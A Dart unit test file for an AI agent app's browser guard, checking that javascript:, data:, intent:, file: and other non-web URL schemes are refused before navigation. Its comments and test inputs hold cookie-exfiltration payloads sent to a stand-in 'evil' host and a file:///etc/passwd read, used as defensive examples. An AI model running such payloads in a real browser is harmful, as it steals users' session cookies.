import 'package:flutter_test/flutter_test.dart';
import 'package:shared_preferences/shared_preferences.dart';

import 'package:ovid_ai/core/agent_service.dart';
import 'package:ovid_ai/core/state.dart';

/// SECURITY (2026-09-24): the browser host-grant gate only fired for
/// http/https, so every OTHER scheme fell straight through to
/// `WebViewController.loadRequest`.
///
/// `javascript:` is the serious one: Android executes it in the CURRENT page's
/// origin, so `javascript:fetch('https://evil/'+document.cookie)` runs on a
/// site the user had already granted — using that site's cookie jar — with no
/// host grant for `evil` and no prompt. `data:` loads unguarded content the
/// same way, and custom app schemes were handed to the OS.
///
/// The guard lives in `navigateTab`, the single choke point every navigation
/// goes through (both browser tools and the address bar).
void main() {
  TestWidgetsFlutterBinding.ensureInitialized();

  setUp(() async {
    SharedPreferences.setMockInitialValues({});
    AppState.resetTestInstance();
    final app = AppState.createForTest();
    app.seenWelcomeVersion = AppState.welcomeVersion;
    AgentService.I.debugPauseScheduleTimerForTest(true);
  });

  tearDown(() {
    AgentService.I.debugPauseScheduleTimerForTest(false);
    AppState.resetTestInstance();
  });

  group('loadable tab URL schemes', () {
    test('script-executing schemes are refused', () {
      expect(AgentService.isLoadableTabUrl('javascript:alert(1)'), isFalse);
      expect(
        AgentService.isLoadableTabUrl(
          "javascript:fetch('https://evil.example/'+document.cookie)",
        ),
        isFalse,
      );
      expect(
        AgentService.isLoadableTabUrl('data:text/html,<script>alert(1)</'
            'script>'),
        isFalse,
      );
      // Case-insensitive: the WebView does not care about scheme case.
      expect(AgentService.isLoadableTabUrl('JaVaScRiPt:alert(1)'), isFalse);
      expect(AgentService.isLoadableTabUrl(' javascript:alert(1)'), isFalse);
    });

    test('app/OS schemes are refused', () {
      expect(AgentService.isLoadableTabUrl('mailto:a@b.example'), isFalse);
      expect(AgentService.isLoadableTabUrl('tel:+15551234'), isFalse);
      expect(AgentService.isLoadableTabUrl('whatsapp://send?phone=1'), isFalse);
      expect(AgentService.isLoadableTabUrl('intent://scan/#Intent;end'), isFalse);
      expect(AgentService.isLoadableTabUrl('file:///etc/passwd'), isFalse);
    });

    test('web pages are allowed', () {
      expect(AgentService.isLoadableTabUrl('https://example.com'), isTrue);
      expect(AgentService.isLoadableTabUrl('http://example.com/x?q=1'), isTrue);
      expect(AgentService.isLoadableTabUrl('about:blank'), isTrue);
    });

    test('scheme-less local targets stay allowed (preview path resolves them)',
        () {
      expect(AgentService.isLoadableTabUrl('index.html'), isTrue);
      expect(AgentService.isLoadableTabUrl('./dist/index.html'), isTrue);
      expect(AgentService.isLoadableTabUrl('/work/site/index.html'), isTrue);
    });

    test('empty input is refused', () {
      expect(AgentService.isLoadableTabUrl(''), isFalse);
      expect(AgentService.isLoadableTabUrl('   '), isFalse);
    });
  });

  group('refusal reason', () {
    test('explains why for a refused scheme and stays silent for a web page',
        () {
      final reason = AgentService.unloadableUrlReason(
        'javascript:fetch(document.cookie)',
        tool: 'browser_open',
      );
      expect(reason, isNotNull);
      expect(reason, contains('browser_open'));
      expect(reason, contains('javascript'));
      // The model must be told to involve the user, not silently blocked.
      expect(reason, contains('ask the user'));

      expect(
        AgentService.unloadableUrlReason('https://example.com',
            tool: 'browser_open'),
        isNull,
      );
    });
  });

  group('navigateTab refuses before touching the tab', () {
    test('a javascript: URL never becomes the tab url', () async {
      final tab = BrowserTab(
        url: 'https://safe.example/start',
        sessionId: 'scheme-guard',
      );

      await AgentService.I.navigateTab(tab, 'javascript:alert(document.cookie)');

      expect(
        tab.url,
        'https://safe.example/start',
        reason: 'the refused URL must not be recorded as the tab location',
      );
    });

    test('an http URL passes the guard and proceeds', () async {
      final tab = BrowserTab(url: 'about:blank', sessionId: 'scheme-guard');

      // With no controller, navigateTab records the target and then asks
      // controllerForTab for a WebView — which needs a platform implementation
      // that unit tests do not have. Reaching that point is the proof the
      // guard let the URL through; a refused URL returns before touching
      // `tab.url` at all.
      try {
        await AgentService.I.navigateTab(tab, 'https://example.com/page');
      } catch (_) {/* no WebView platform in a unit test */}

      expect(tab.url, 'https://example.com/page');
    });
  });
}
